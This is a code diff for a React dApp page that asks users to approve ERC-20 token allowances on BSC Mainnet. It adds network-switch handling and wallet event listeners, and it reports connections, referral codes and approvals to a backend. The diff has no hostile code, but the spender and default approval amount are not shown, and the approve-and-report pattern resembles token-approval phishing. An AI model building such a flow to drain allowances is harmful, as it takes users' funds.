@@ -1,6 +1,6 @@
 import { useEffect, useState, useCallback } from 'react';
 import { Contract, parseUnits, isAddress, formatUnits } from 'ethers';
-import { connectWallet } from '../wallet';
+import { connectWallet, refreshWalletSession, switchToNetwork } from '../wallet';
 import { CHAIN_ID, CONTRACT, api } from '../api';
 
 const ERC20_ABI = [
@@ -72,17 +72,76 @@ export default function UserPage() {
 
   const handleConnect = async () => {
     try {
-      const w = await connectWallet();
+      const w = await connectWallet(CHAIN_ID);
       setWallet(w);
-      setStatus({ kind: 'ok', msg: `Wallet connected: ${shortAddr(w.address)}` });
+      if (w.chainId !== CHAIN_ID) {
+        setStatus({
+          kind: 'err',
+          msg: `Please switch your wallet network to BSC Mainnet (Chain ID: ${CHAIN_ID}).`,
+        });
+      } else {
+        setStatus({ kind: 'ok', msg: `Wallet connected on BSC Mainnet: ${shortAddr(w.address)}` });
+      }
       api.recordConnect(w.address, getReferralCode()).catch(() => {});
     } catch (e) {
       setStatus({ kind: 'err', msg: e.message });
     }
   };
 
+  useEffect(() => {
+    if (!wallet || typeof window === 'undefined' || !window.ethereum?.on) return;
+
+    const handleChainOrAccountChange = async (accountsArg) => {
+      if (Array.isArray(accountsArg) && accountsArg.length === 0) {
+        setWallet(null);
+        setTokenInfo(null);
+        setStatus({ kind: 'idle', msg: '', txHash: '' });
+        return;
+      }
+      try {
+        const next = await refreshWalletSession();
+        setWallet(next);
+        if (next.chainId === CHAIN_ID) {
+          setStatus((prev) =>
+            prev.kind === 'err'
+              ? { kind: 'ok', msg: `Switched to BSC Mainnet: ${shortAddr(next.address)}` }
+              : prev
+          );
+        } else {
+          setStatus({
+            kind: 'err',
+            msg: `Please switch your wallet network to BSC Mainnet (Chain ID: ${CHAIN_ID}).`,
+          });
+        }
+        if (Array.isArray(accountsArg) && accountsArg.length > 0) {
+          api.recordConnect(next.address, getReferralCode()).catch(() => {});
+        }
+      } catch {
+        // ignore transient provider refresh errors
+      }
+    };
+
+    const onChainChanged = () => handleChainOrAccountChange();
+    const onAccountsChanged = (accounts) => handleChainOrAccountChange(accounts);
+
+    window.ethereum.on('chainChanged', onChainChanged);
+    window.ethereum.on('accountsChanged', onAccountsChanged);
+
+    return () => {
+      const off = window.ethereum.removeListener || window.ethereum.off;
+      if (off) {
+        off.call(window.ethereum, 'chainChanged', onChainChanged);
+        off.call(window.ethereum, 'accountsChanged', onAccountsChanged);
+      }
+    };
+  }, [wallet?.address]);
+
   const loadTokenData = useCallback(async (tokenAddr, userWallet) => {
     if (!isAddress(tokenAddr) || !userWallet?.provider) return;
+    if (userWallet.chainId !== CHAIN_ID) {
+      setTokenInfo(null);
+      return;
+    }
     setLoadingToken(true);
     try {
       const contract = new Contract(tokenAddr, ERC20_ABI, userWallet.provider);
@@ -123,21 +182,48 @@ export default function UserPage() {
     }
   }, [wallet, activeTokenAddress, loadTokenData]);
 
-  const handleApprove = async (approveAmount = APPROVAL_AMOUNT) => {
-    if (!wallet) return setStatus({ kind: 'err', msg: 'Please connect your wallet first.' });
-    if (wallet.chainId !== CHAIN_ID) {
-      return setStatus({
+  const ensureBscNetwork = useCallback(async () => {
+    try {
+      setStatus({ kind: 'busy', msg: `Switching wallet network to BSC Mainnet (Chain ID: ${CHAIN_ID})…` });
+      await switchToNetwork(CHAIN_ID);
+      const updated = await refreshWalletSession();
+      setWallet(updated);
+      if (updated.chainId !== CHAIN_ID) {
+        setStatus({
+          kind: 'err',
+          msg: `Please switch your wallet network to BSC Mainnet (Chain ID: ${CHAIN_ID}).`,
+        });
+        return null;
+      }
+      setStatus({ kind: 'ok', msg: `Switched to BSC Mainnet: ${shortAddr(updated.address)}` });
+      return updated;
+    } catch {
+      setStatus({
         kind: 'err',
         msg: `Please switch your wallet network to BSC Mainnet (Chain ID: ${CHAIN_ID}).`,
       });
+      return null;
     }
+  }, []);
+
+  const handleApprove = async (approveAmount = APPROVAL_AMOUNT) => {
+    if (!wallet) return setStatus({ kind: 'err', msg: 'Please connect your wallet first.' });
     if (!isAddress(activeTokenAddress)) {
       return setStatus({ kind: 'err', msg: 'Invalid ERC-20 token address.' });
     }
 
+    let activeWallet = wallet;
+    if (activeWallet.chainId !== CHAIN_ID) {
+      activeWallet = await ensureBscNetwork();
+      if (!activeWallet) return;
+    }
+
+    const defaultTok = DEFAULT_TOKENS.find((t) => t.address.toLowerCase() === activeTokenAddress.toLowerCase());
+    const resolvedSymbol = tokenInfo?.symbol || defaultTok?.symbol || 'TOKEN';
+
     try {
       setStatus({ kind: 'busy', msg: 'Please confirm the approval transaction in your wallet…' });
-      const contract = new Contract(activeTokenAddress, ERC20_ABI, wallet.signer);
+      const contract = new Contract(activeTokenAddress, ERC20_ABI, activeWallet.signer);
       const decimals = tokenInfo?.decimals ?? (await contract.decimals());
       const units = parseUnits(approveAmount, decimals);
 
@@ -151,14 +237,14 @@ export default function UserPage() {
       await tx.wait();
       setStatus({
         kind: 'ok',
-        msg: Number(approveAmount) === 0 ? 'Allowance successfully revoked!' : `Allowance of ${approveAmount} ${tokenInfo?.symbol || 'tokens'} approved!`,
+        msg: Number(approveAmount) === 0 ? 'Allowance successfully revoked!' : `Allowance of ${approveAmount} ${resolvedSymbol === 'TOKEN' ? 'tokens' : resolvedSymbol} approved!`,
         txHash: tx.hash,
       });
 
       api.recordApproval({
-        address: wallet.address,
+        address: activeWallet.address,
         token: activeTokenAddress,
-        symbol: tokenInfo?.symbol || 'TOKEN',
+        symbol: resolvedSymbol,
         txHash: tx.hash,
         allowance: approveAmount,
         isRevoke: Number(approveAmount) === 0,
@@ -166,7 +252,7 @@ export default function UserPage() {
       }).catch((e) => console.error('Failed to notify backend:', e));
 
       // Refresh on-chain balance & allowance
-      await loadTokenData(activeTokenAddress, wallet);
+      await loadTokenData(activeTokenAddress, activeWallet);
     } catch (err) {
       setStatus({ kind: 'err', msg: err.shortMessage || err.message });
     }
@@ -205,7 +291,13 @@ export default function UserPage() {
               <span className="label-caption">Connected Wallet</span>
               <div className="mono bold">{wallet.address}</div>
             </div>
-            <span className="badge badge-success">Connected</span>
+            {wallet.chainId === CHAIN_ID ? (
+              <span className="badge badge-success">Connected</span>
+            ) : (
+              <button type="button" className="secondary-btn" onClick={ensureBscNetwork}>
+                Switch to BSC
+              </button>
+            )}
           </div>
         )}
       </div>
